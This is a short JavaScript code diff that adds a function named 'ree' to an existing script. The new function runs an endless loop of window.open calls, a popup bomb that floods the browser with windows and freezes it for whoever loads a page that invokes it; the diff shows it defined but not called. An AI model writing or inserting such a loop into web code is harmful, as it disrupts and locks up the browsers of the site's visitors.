@@ -58,3 +58,8 @@ function workplease(newdealer){
     pass=true
 
 }
+function ree(){
+  while (true) {
+    window.open(url,'fortniteburger.net');
+  }
+}
